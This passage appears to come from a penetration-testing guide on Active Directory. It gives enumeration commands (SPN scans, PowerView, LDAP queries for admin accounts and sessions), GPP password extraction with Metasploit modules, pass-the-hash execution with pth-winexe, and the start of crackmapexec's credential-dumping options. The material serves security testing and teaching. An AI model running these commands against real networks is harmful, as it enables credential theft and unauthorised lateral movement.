<p>Scott Sutherland has written about SPN scanning techniques at <a class="reference external" href="https://blog.netspi.com/faster-domain-escalation-using-ldap/">Faster Domain Esclation using LDAP</a> .The <a class="reference external" href="https://github.com/nullbind/Powershellery/blob/master/Stable-ish/Get-SPN/Get-SPN.psm1">Get-SPN</a> Powershell module provides us to quickly search LDAP for accounts related to specific groups, users or SPN service name. Once Downloaded the script run the following command in a command prompt in order to install it for the current session.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">C:\&gt; Powershell -nop -exec bypass -noexit (change the directory pointing towards the downloaded location)</span>
<span class="go">PS C:\&gt; Import-Module .\Get-SPN.psm1</span>
</pre></div>
</div>
<p>Find All Servers where Domain Admins are Registered to Run Services. If we are using the Domain User or local system from a particular Domain computer use the following command</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Get-SPN -type group -search &quot;Domain Admins&quot; -List yes | Format-Table -Autosize</span>
</pre></div>
</div>
<p>for a non domain system with domain credentials we can use the command below</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Get-SPN  -type group -search &quot;Domain Admins&quot; -List yes -DomainController 192.168.1.100 -Credential domainuser | Format-Table -Autosize</span>
</pre></div>
</div>
</section>
<section id="find-all-registered-sql-servers-dcom-dnscache-etc">
<h4>Find all registered SQL Servers, Dcom, dnscache etc.<a class="headerlink" href="#find-all-registered-sql-servers-dcom-dnscache-etc" title="Link to this heading"></a></h4>
<p>for identifying the services using the Domain User or localsystem from a particular Domain computer use the following command</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Get-SPN  -type service -search &quot;MSSQLSvc*&quot; -List yes | Format-Table -Autosize</span>
</pre></div>
</div>
<p>for other than Servers, below is a list of standard SPN service names.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">alerter,appmgmt,browser,cifs,cisvc,clipsrv,dcom,dhcp,dmserver,dns,dnscache,eventlog,eventsystem,fax,</span>
<span class="go">http,ias,iisadmin,messenger,msiserver,mcsvc,netdde,netddedsm,netlogon,netman,nmagent,oakley,plugplay,policyagent,</span>
<span class="go">protectedstorage,rasman,remoteaccess,replicator,rpc,rpclocator,rpcss,rsvp,samss,scardsvr,scesrv,schedule,scm,seclogon,</span>
<span class="go">snmp,spooler,tapisrv,time,trksvr,trkwks,ups,w3svc,wins,www</span>
</pre></div>
</div>
<p>To find All the ServicePrincipalName Entries for Domain Users Matching String by executing the command as domain user or LocalSystem from a domain computer then you can use the command below.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Get-SPN  -type user -search &quot;*svc*&quot; -List yes</span>
</pre></div>
</div>
</section>
<section id="discovering-the-service-accounts">
<h4>Discovering the Service Accounts<a class="headerlink" href="#discovering-the-service-accounts" title="Link to this heading"></a></h4>
<p>By Doing an SPN Scan for user accounts with Service Principal Names the service Accounts and the server accounts used can be identified.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; get-aduser -filter {ServicePrincipalName -like “*”} -Properties PasswordLastSet,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation</span>
</pre></div>
</div>
</section>
<section id="discovering-the-computers-and-domain-controllers-without-scanning-the-network">
<h4>Discovering the Computers and Domain Controllers without scanning the network<a class="headerlink" href="#discovering-the-computers-and-domain-controllers-without-scanning-the-network" title="Link to this heading"></a></h4>
<p>The information regarding the computer operating system, DNSHostName, LastLogon Date etc. can also be gathered. Since every computer joining the active directory has an associated computer account in AD. When the computer is joined, several attributes such as date created, Modified, OperatingSystemVersion etc. are associated with this computer object that are updated. Such information can also be further used for lateral movements.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; get-adcomputer -filter {PrimaryGroupID -eq “515”} -Properties OperatingSystem,OperatingSystemVersion,OperatingSystemServicePack,</span>
<span class="go">Passwot,LastLogonDate,ServicePrincipalName,TrustedForDelegation,TrustedtoAuthForDelegation</span>
</pre></div>
</div>
<p>The same information regarding the Domain Controllers can also be gathered by simply changing the PrimaryGroupID value to ‘516’. to obtain the details of all the computers in active directory by simply putting a wildcard mask in the filter parameter such as “-filter * “.</p>
</section>
<section id="identifying-the-admin-accounts">
<h4>Identifying the Admin Accounts<a class="headerlink" href="#identifying-the-admin-accounts" title="Link to this heading"></a></h4>
<p>The privileged accounts can be identified using two methods. The first one is by doing a detailed group enumeration, by doing this all members of the standard Active Directory admin groups: Domain Admins, Administrators, Enterprise Admins, etc. one such command is “Net Group “Domain Admins” /Domain” which will give us the list of Domain Administrators.</p>
<p>Another method is by identifying all accounts which have the attribute “AdminCount” set to 1. However, this may not be sometimes accurate since there may be accounts returned in this query which no longer have admin rights because these values aren’t automatically reset even if the accounts are disabled or no longer a part of Admins group.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; get-aduser -filter {AdminCount -eq 1} -Properties Name,AdminCount,ServicePrincipalName,PasswordLastSet,LastLogonDate,MemberOf</span>
</pre></div>
</div>
<p>This query will give us the “AdminCount :1” which indicates that the account is privileged account.</p>
</section>
<section id="finding-the-admin-groups">
<h4>Finding the Admin Groups<a class="headerlink" href="#finding-the-admin-groups" title="Link to this heading"></a></h4>
<p>Most of the organizations follow a naming convention for the admin groups such as Domain Admins, Server Admins, Workstation Admins, Administrators etc. By Querying the Active Directory for groups with Admin as term we can identify the administrator groups.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; get-adgroup -filter {GroupCategory -eq ‘Security’ -AND Name -like “*admin*”}</span>
</pre></div>
</div>
</section>
<section id="id8">
<h4>Domain Password Policy<a class="headerlink" href="#id8" title="Link to this heading"></a></h4>
<p>The Domain password policy can be easily gathered either by using Net Accounts or Get-ADDefaultPasswordPolicy.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Get-ADDefaultDomainPasswordPolicy</span>
<span class="go">Net Accounts</span>
</pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>To use Get-ADDefaultPasswordPolicy PowerView.PS1 module is to be imported first.</p>
</div>
</section>
<section id="identifying-the-groups-with-local-admin-rights-to-windows-machines">
<h4>Identifying the Groups with Local Admin Rights to windows machines<a class="headerlink" href="#identifying-the-groups-with-local-admin-rights-to-windows-machines" title="Link to this heading"></a></h4>
<p>Using the Powerview.PS1 module we can easily identify the identify GPOs that include Restricted Groups.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; Get-NetGPOGroup</span>
</pre></div>
</div>
<p>we can also check to what OUs the GPOs link using a PowerView cmdlet.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">get-netOU -guid “GPOName Obtained Above”</span>
</pre></div>
</div>
<p>next to identify the workstations/servers in the OU</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">get-adcomputer -filter * -SearchBase “Result of the above”</span>
</pre></div>
</div>
</section>
</section>
<section id="powershell-adsisearcher-type-accelerator">
<h3>PowerShell [adsiSearcher] Type Accelerator<a class="headerlink" href="#powershell-adsisearcher-type-accelerator" title="Link to this heading"></a></h3>
<p>If we have credentials of the user and a powershell prompt, we can utilize adsiSearcher to do the AD Enumeration</p>
<section id="define-username-password-domain-etc">
<h4>Define username, password, Domain, etc.<a class="headerlink" href="#define-username-password-domain-etc" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$</span><span class="nv">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;BITVIJAYS\LDAP&#39;</span>
<span class="gp">$</span><span class="nv">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;PasswordForSearch!&#39;</span>
<span class="gp">$</span><span class="nv">DomainControllerIpAddress</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;10.2.2.2&#39;</span>
<span class="gp">$</span><span class="nv">LdapDn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;DC=bitvjays,DC=local&#39;</span>
</pre></div>
</div>
</section>
<section id="initialize-the-connection">
<h4>Initialize the connection<a class="headerlink" href="#initialize-the-connection" title="Link to this heading"></a></h4>
<p>When credentials are present and we are connecting using a non-domain machine, use below</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$</span><span class="nv">dn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.DirectoryServices.DirectoryEntry<span class="w"> </span><span class="o">(</span><span class="s2">&quot;LDAP://</span><span class="k">$(</span><span class="nv">$DomainControllerIpAddress</span><span class="k">)</span><span class="s2">:389/</span><span class="nv">$LdapDn</span><span class="s2">&quot;</span>,<span class="nv">$username</span>,<span class="nv">$password</span><span class="o">)</span>
<span class="gp">$</span><span class="nv">ds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-object<span class="w"> </span>System.DirectoryServices.DirectorySearcher<span class="o">(</span><span class="nv">$dn</span><span class="o">)</span>
</pre></div>
</div>
<p>When you are already connected to the domain machine</p>
<p>[adsisearcher]”” specifies a filter that has no characters in it. The good thing is that the searchroot is automatically set to the root of the current domain.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$</span><span class="nv">ds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>adsisearcher<span class="o">]</span><span class="s2">&quot;&quot;</span>
</pre></div>
</div>
</section>
<section id="finding-the-domain-name">
<h4>Finding the Domain Name<a class="headerlink" href="#finding-the-domain-name" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$</span>ds.SearchRoot
<span class="go">distinguishedName : {DC=bitvijays,DC=local}</span>
<span class="go">Path : LDAP://DC=bitvijays,DC=local</span>
</pre></div>
</div>
</section>
<section id="finding-the-computers">
<h4>Finding the Computers<a class="headerlink" href="#finding-the-computers" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS &gt; $ds.Filter =&quot;((objectCategory=computer))&quot;</span>
<span class="go">PS &gt; $ds.FindAll() --- Provides all the objects in the AD for computers</span>
<span class="go">PS &gt; $ds.FindOne() --- Provides one object in the AD for computers</span>
</pre></div>
</div>
<p>Result</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Path                                                                  Properties</span>
<span class="go">----                                                                  ----------</span>
<span class="go">LDAP://10.2.2.2:389/CN=DC,OU=Domain Controllers,DC=bitvijays,DC=local {ridsetreferences, logoncount, codepage, objec...</span>
<span class="go">LDAP://10.2.2.2:389/CN=FILE,CN=Computers,DC=bitvijays,DC=local        {logoncount, codepage, objectcategory, iscriti...</span>
</pre></div>
</div>
</section>
<section id="finding-the-users">
<h4>Finding the Users:<a class="headerlink" href="#finding-the-users" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS &gt; $ds.Filter =&quot;((objectCategory=user))&quot;</span>
<span class="go">PS &gt; $ds.FindAll() --- Provides all the objects in the AD for users</span>
</pre></div>
</div>
</section>
<section id="properties-of-the-object">
<h4>Properties of the object<a class="headerlink" href="#properties-of-the-object" title="Link to this heading"></a></h4>
<p>We can use</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$</span>ds.FindOne<span class="o">()</span>.properties
<span class="gp">$</span>ds.FindAll<span class="o">()</span>.properties
</pre></div>
</div>
<p>to find the properties of the object. Once the properties are found, we can search for any particular object based on regex.</p>
<p>Examples:</p>
<ul class="simple">
<li><p>Finding a particular user named Bob</p></li>
</ul>
<blockquote>
<div><p>Check the properties of the user</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Properties of a user</span>
<span class="go">PS &gt; $ds.findOne().properties</span>

<span class="go">Name                           Value</span>
<span class="go">----                           -----</span>
<span class="go">objectcategory                 {CN=Person,CN=Schema,CN=Configuration,DC=bitvijays,DC=local}</span>
<span class="go">name                           {Administrator}</span>
<span class="go">cn                             {Administrator}</span>
<span class="go">admincount                     {1}</span>
<span class="go">samaccountname                 {Administrator}</span>
</pre></div>
</div>
<p>Then particularly search for a user</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS &gt; $ds.Filter =&quot;((name=*Bob*))&quot;</span>
<span class="go">PS &gt; $ds.Findall()</span>

<span class="go">Path                                                                Properties</span>
<span class="go">----                                                                ----------</span>
<span class="go">LDAP://10.2.2.2:389/CN=Bobby John,OU=People,DC=bitvijays,DC=local {logoncount, codepage, objectcategory, descripti...</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Finding all users of a particular group</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$</span>ds.filter<span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;(&amp;(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,DC=bitvijays,dc=local))&quot;</span>
</pre></div>
</div>
</div></blockquote>
</section>
</section>
<section id="get-sessions-of-remote-machines">
<h3>Get sessions of remote machines<a class="headerlink" href="#get-sessions-of-remote-machines" title="Link to this heading"></a></h3>
<section id="powerview-get-netsession">
<h4>Powerview Get-NetSession<a class="headerlink" href="#powerview-get-netsession" title="Link to this heading"></a></h4>
</section>
<section id="net-session">
<h4>net session<a class="headerlink" href="#net-session" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Net session of current computer</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">net session</span>

<span class="go">Computer               User name            Client Type       Opens Idle time</span>

<span class="go">-------------------------------------------------------------------------------</span>
<span class="go">\\127.0.0.1            Administrat0r                              1 05D 22H 02M</span>

<span class="go">The command completed successfully.</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Net session of remote computer</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">net session \\computername</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="wmi">
<h4>WMI<a class="headerlink" href="#wmi" title="Link to this heading"></a></h4>
<p>We can use wmi to get the remote logged on users. However, I believe to run wmi on remote machine, you need to be administrator of that machine.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">wmic:root\cli&gt; /node:&quot;computername&quot; path win32_loggeduser get antecedent</span>

<span class="go">\\.\root\cimv2:Win32_Account.Domain=&quot;ABCROOT&quot;,Name=&quot;axx.xxxxx&quot;</span>
<span class="go">\\.\root\cimv2:Win32_Account.Domain=&quot;ABCROOT&quot;,Name=&quot;srv.xxxxx&quot;</span>
<span class="go">\\.\root\cimv2:Win32_Account.Domain=&quot;ABCROOT&quot;,Name=&quot;axx.xxxxx&quot;</span>
<span class="go">\\.\root\cimv2:Win32_Account.Domain=&quot;MA&quot;,Name=&quot;axxd.xxxxx&quot;</span>
<span class="go">\\.\root\cimv2:Win32_Account.Domain=&quot;DC&quot;,Name=&quot;ANONYMOUS LOGON&quot;</span>
</pre></div>
</div>
</section>
</section>
<section id="view-users-in-domain-workgroup">
<h3>View users in Domain / Workgroup<a class="headerlink" href="#view-users-in-domain-workgroup" title="Link to this heading"></a></h3>
<section id="powerview-get-netuser">
<h4>Powerview Get-NetUser<a class="headerlink" href="#powerview-get-netuser" title="Link to this heading"></a></h4>
</section>
<section id="net-user-domain">
<h4>net user /domain<a class="headerlink" href="#net-user-domain" title="Link to this heading"></a></h4>
</section>
<section id="id9">
<h4>WMI<a class="headerlink" href="#id9" title="Link to this heading"></a></h4>
<p>Domain users:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">wmic useraccount list /format:list</span>
</pre></div>
</div>
</section>
</section>
<section id="view-machines-in-domain-workgroup">
<h3>View machines in Domain/ Workgroup<a class="headerlink" href="#view-machines-in-domain-workgroup" title="Link to this heading"></a></h3>
<section id="powerview-get-netcomputers">
<h4>Powerview Get-NetComputers<a class="headerlink" href="#powerview-get-netcomputers" title="Link to this heading"></a></h4>
</section>
<section id="net-view-domain">
<h4>net view /domain<a class="headerlink" href="#net-view-domain" title="Link to this heading"></a></h4>
<p>? – check the functionality</p>
</section>
<section id="view-machines-affected-by-gpp-vulnerability">
<h4>View machines affected by GPP vulnerability<a class="headerlink" href="#view-machines-affected-by-gpp-vulnerability" title="Link to this heading"></a></h4>
<p>When we run Get-GPPPassword, we get output like</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Password: password@123</span>
<span class="go">Changed : 2013-07-02 01:01:23</span>
<span class="go">Username: Administrator</span>
<span class="go">NewName :</span>
<span class="go">File    : \\Demo.lab\sysvol\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\{DataSouces| Groups| ScheduledTasks.xml</span>
</pre></div>
</div>
<p>To get the computers using the passwords set by the GPP, we can use</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Get-NetOU -GUID &quot;{31B2F340-016D-11D2-945F-00C04FB984F9}&quot; | %{ Get-NetComputer -ADSPath $_ }</span>
</pre></div>
</div>
<p>Get-NetSite function, which returns the current sites for a domain, also accepts the -GUID filtering flag. This information has been taken from harmj0y blog <a class="reference external" href="http://www.harmj0y.net/blog/powershell/gpp-and-powerview/">gpp and powerview</a></p>
<p>More information about GPP should be read from Sean Metcalf blog <a class="reference external" href="https://adsecurity.org/?p=384">Using Group Policy Preferences for Password Management = Bad Idea</a> and <a class="reference external" href="https://adsecurity.org/?p=2288">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</a></p>
<p>There are various methods to figure out the GPP Password if it’s set.</p>
<ul class="simple">
<li><p><a class="reference external" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">Get-GPPPassword.ps1</a> :  <strong>PowerShell script</strong> that can identify and extract the password(s) stored in Group Policy Preferences using the MSDN AES key.</p></li>
<li><p><strong>Metasploit auxiliary module - SMB Group Policy Preference Saved Passwords Enumeration</strong> :  This module enumerates files from target domain controllers and connects to them via SMB. It then looks for Group Policy Preference XML files containing local/domain user accounts and passwords and decrypts them using Microsoft’s public AES key. This module has been tested successfully on a Win2k8 R2 Domain Controller. ( Requires domain user credentials)</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/smb/smb_enum_gpp</span>
<span class="go">set smbdomain example.com</span>
<span class="go">set smbuser user</span>
<span class="go">set smbpass pass</span>
<span class="go">set rhosts 192.168.56.2</span>
</pre></div>
</div>
<p>Thanks to Tanoy Bose for informing about this!. Previously, we used to manually search the SYSVOL location! ( When for some reason Get-GPPPassword doesn’t work! )</p>
</div></blockquote>
<ul class="simple">
<li><p><strong>Meterpreter session</strong>, we can use metasploit post module - Windows Gather Group Policy Preference Saved Passwords : This module enumerates the victim machine’s domain controller and connects to it via SMB. It then looks for Group Policy Preference XML files containing local user accounts and passwords and decrypts them using Microsoft’s public AES key. Cached Group Policy files may be found on end-user devices if the group policy object is deleted rather than unlinked.</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use post/windows/gather/credentials/gpp</span>
<span class="go">set session &lt;Session_Number&gt;</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p><strong>Reading Group Policies</strong> manually stored here: \&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</p></li>
</ul>
</section>
</section>
<section id="view-group-in-domain-workgroup">
<h3>View group in Domain / Workgroup<a class="headerlink" href="#view-group-in-domain-workgroup" title="Link to this heading"></a></h3>
<section id="powerview-get-netgroupmember">
<h4>Powerview Get-NetGroupMember<a class="headerlink" href="#powerview-get-netgroupmember" title="Link to this heading"></a></h4>
</section>
<section id="net-group-domain">
<h4>Net group / domain<a class="headerlink" href="#net-group-domain" title="Link to this heading"></a></h4>
</section>
<section id="windows-resource-kit-local-global-executable">
<h4>Windows Resource Kit Local/ Global executable<a class="headerlink" href="#windows-resource-kit-local-global-executable" title="Link to this heading"></a></h4>
<ul class="simple">
<li><p>Global.exe</p></li>
</ul>
<blockquote>
<div><div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; .\global.exe</span>

<span class="go">Displays members of global groups on remote servers or domains.</span>

<span class="go">GLOBAL group_name domain_name | \\server</span>

<span class="go">group_name    The name of the global group to list the members of.</span>
<span class="go">domain_name   The name of a network domain.</span>
<span class="go">\\server      The name of a network server.</span>

<span class="go">Examples:</span>
<span class="go">Global &quot;Domain Users&quot; EastCoast</span>
<span class="go">Displays the members of the group &#39;Domain Users&#39; in the EastCoast domain.</span>

<span class="go">Global PrintUsers \\BLACKCAT</span>
<span class="go">Displays the members of the group PrintUsers on server BLACKCAT.</span>

<span class="go">Notes:</span>
<span class="go">Names that include space characters must be enclosed in double quotes.</span>
<span class="go">To list members of local groups use Local.Exe.</span>
<span class="go">To get the Server name for a give Domain use GetDC.Exe.</span>
</pre></div>
</div>
<p>Example:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">PS C:\&gt; .\global.exe &quot;Domain Admins&quot; \\domainname</span>
<span class="go">Uraxxxx</span>
<span class="go">axx.xxxxx</span>
<span class="go">axx.xxxxx2</span>
<span class="go">axx.xxxxxx3</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="bloodhound-group-memberships">
<h4>BloodHound Group Memberships<a class="headerlink" href="#bloodhound-group-memberships" title="Link to this heading"></a></h4>
</section>
<section id="wmi-user-groups">
<h4>WMI user groups<a class="headerlink" href="#wmi-user-groups" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">wmic group list brief</span>
<span class="go">ABCD\SUS Administrator    ABCD          SUS Administrator                                         S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-7357</span>
<span class="go">ABCD\VPN Admins           ABCD          VPN Admins                                                S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-8728</span>
<span class="go">ABCD\VPN Users            ABCD          VPN Users                                                 S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-9229</span>
<span class="go">ABCD\XXX - OER Users      ABCD          XXX - OER Users                                           S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-5095</span>
</pre></div>
</div>
</section>
</section>
<section id="hunting-for-a-particular-user">
<h3>Hunting for a particular User?<a class="headerlink" href="#hunting-for-a-particular-user" title="Link to this heading"></a></h3>
<section id="powerview-invoke-userhunter">
<h4>Powerview Invoke-UserHunter<a class="headerlink" href="#powerview-invoke-userhunter" title="Link to this heading"></a></h4>
</section>
<section id="bloodhound-users-sessions">
<h4>BloodHound users_sessions<a class="headerlink" href="#bloodhound-users-sessions" title="Link to this heading"></a></h4>
</section>
<section id="eventlog-ad">
<h4>EventLog AD?<a class="headerlink" href="#eventlog-ad" title="Link to this heading"></a></h4>
<p>How? Not yet successful!</p>
</section>
</section>
</section>
<section id="remote-code-execution-methods">
<span id="id10"></span><h2>Remote Code Execution Methods<a class="headerlink" href="#remote-code-execution-methods" title="Link to this heading"></a></h2>
<p>A lot of details for Remote Code execution has already been mentioned by Rop Nop in his three parts <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes/">Part 1: Using credentials to own windows boxes</a> , <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/">Part2: PSExec and Services</a> and <a class="reference external" href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/">Part: 3 Wmi and WinRM</a> and by scriptjunkie in his blog <a class="reference external" href="https://www.scriptjunkie.us/2013/02/authenticated-remote-code-execution-methods-in-windows/">Authenticated Remote Code Execution Methods in Windows</a></p>
<p>We have just summarized all in one page with <em>working</em> examples wherever possible.</p>
<section id="winexe">
<h3>Winexe<a class="headerlink" href="#winexe" title="Link to this heading"></a></h3>
<section id="linux-binary-pth-winexe">
<h4>Linux Binary pth-winexe<a class="headerlink" href="#linux-binary-pth-winexe" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">winexe version 1.1</span>
<span class="go">Usage: winexe [OPTION]... //HOST COMMAND</span>
<span class="go">Options:</span>
<span class="go"> -h, --help                                  Display help message</span>
<span class="go"> -V, --version                               Display version number</span>
<span class="go"> -U, --user=[DOMAIN/]USERNAME[%PASSWORD]     Set the network username</span>
<span class="go"> -A, --authentication-file=FILE              Get the credentials from a file</span>
<span class="go"> -N, --no-pass                               Do not ask for a password</span>
<span class="go"> -k, --kerberos=STRING                       Use Kerberos, -k [yes|no]</span>
<span class="go"> -d, --debuglevel=DEBUGLEVEL                 Set debug level</span>
<span class="go">     --uninstall                             Uninstall winexe service after remote execution</span>
<span class="go">     --reinstall                             Reinstall winexe service before remote execution</span>
<span class="go">     --system                                Use SYSTEM account</span>
<span class="go">     --profile                               Load user profile</span>
<span class="go">     --convert                               Try to convert characters between local and remote code-pages</span>
<span class="go">     --runas=[DOMAIN\]USERNAME%PASSWORD      Run as the given user (BEWARE: this password is sent in cleartext over the network!)</span>
<span class="go">     --runas-file=FILE                       Run as user options defined in a file</span>
<span class="go">     --interactive=0|1                       Desktop interaction: 0 - disallow, 1 - allow. If allow, also use the --system switch (Windows requirement). Vista does not support this option.</span>
<span class="go">     --ostype=0|1|2                          OS type: 0 - 32-bit, 1 - 64-bit, 2 - winexe will decide. Determines which version (32-bit or 64-bit) of service will be installed.</span>
</pre></div>
</div>
<p>Example with pth:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">pth-winexe -U ./Administrator%aad3b435b51404eeaad3b435b51404ee:4b579a266f697c2xxxxxxxxx //10.145.X.X cmd.exe</span>
<span class="go">pth-winexe -U EXAMPLE/Administrator%example@123 //10.145.X.X cmd.exe</span>
</pre></div>
</div>
<p>If we want to login as NTAuthority, probably use –system. (Helpful when we to run commands as NTAuthority such as installing ssh server host keys)</p>
</section>
<section id="windows-binary-win-exe">
<h4>Windows Binary win-exe<a class="headerlink" href="#windows-binary-win-exe" title="Link to this heading"></a></h4>
<p>win-exe can be downloaded from <a class="reference external" href="https://sourceforge.net/projects/winexe/">winexe</a></p>
<p>commands and usage is same as linux binary pth-winexe. However, it needed to be compiled from the source.</p>
</section>
</section>
<section id="crackmapexec">
<h3>crackmapexec<a class="headerlink" href="#crackmapexec" title="Link to this heading"></a></h3>
<p><a class="reference external" href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> is quite awesome tool when it comes to remote command execution. Read the <a class="reference external" href="https://github.com/byt3bl33d3r/CrackMapExec/wiki">wiki</a></p>
<section id="id13">
<h4>Usage<a class="headerlink" href="#id13" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">positional arguments:</span>
<span class="go">target                The target IP(s), range(s), CIDR(s), hostname(s), FQDN(s) or file(s) containing a list of targets</span>

<span class="go">optional arguments:</span>
<span class="go">  -h, --help            show this help message and exit</span>
<span class="go">  -v, --version         show program&#39;s version number and exit</span>
<span class="go">  -t THREADS            Set how many concurrent threads to use (default: 100)</span>
<span class="go">  -u USERNAME [USERNAME ...]  Username(s) or file(s) containing usernames</span>
<span class="go">  -d DOMAIN             Domain name</span>
<span class="go">  --local-auth          Authenticate locally to each target</span>
<span class="go">  -p PASSWORD [PASSWORD ...]  Password(s) or file(s) containing passwords</span>
<span class="go">  -H HASH [HASH ...]    NTLM hash(es) or file(s) containing NTLM hashes</span>
<span class="go">  -M MODULE, --module MODULE Payload module to use</span>
<span class="go">  -MC CHAIN_COMMAND, --module-chain CHAIN_COMMAND  Payload module chain command string to run</span>
<span class="go">  -o MODULE_OPTION [MODULE_OPTION ...] Payload module options</span>
<span class="go">  -L, --list-modules    List available modules</span>
<span class="go">  --show-options        Display module options</span>
<span class="go">  --verbose             Enable verbose output</span>

<span class="go">Credential Gathering:</span>
<span class="go">Options for gathering credentials</span>

<span class="go">--sam                 Dump SAM hashes from target systems</span>
<span class="go">--lsa                 Dump LSA secrets from target systems</span>
<span class="go">--ntds {vss,drsuapi}  Dump the NTDS.dit from target DCs using the specified method</span>
<span class="go">                      (drsuapi is the fastest)</span>
<span class="go">--ntds-history        Dump NTDS.dit password history</span>
<span class="go">--ntds-pwdLastSet     Shows the pwdLastSet attribute for each NTDS.dit account</span>
<span class="go">--wdigest {enable,disable}</span>
<span class="go">                      Creates/Deletes the &#39;UseLogonCredential&#39; registry key enabling WDigest cred dumping on Windows &gt;= 8.1</span>
<span class="go">Mapping/Enumeration:</span>
<span class="go">Options for Mapping/Enumerating</span>

<span class="go">--shares              Enumerate shares and access</span>
<span class="go">--uac                 Checks UAC status</span>
<span class="go">--sessions            Enumerate active sessions</span>
<span class="go">--disks               Enumerate disks</span>
<span class="go">--users               Enumerate users</span>
<span class="go">--rid-brute [MAX_RID]</span>
<span class="go">                      Enumerate users by bruteforcing RID&#39;s (default: 4000)</span>
<span class="go">--pass-pol            Dump password policy</span>
<span class="go">--lusers              Enumerate logged on users</span>
<span class="go">--wmi QUERY           Issues the specified WMI query</span>
<span class="go">--wmi-namespace NAMESPACE</span>
<span class="go">                      WMI Namespace (default: //./root/cimv2)</span>

<span class="go">Command Execution:</span>
<span class="go">Options for executing commands</span>

<span class="go">--exec-method {smbexec,wmiexec,atexec}</span>
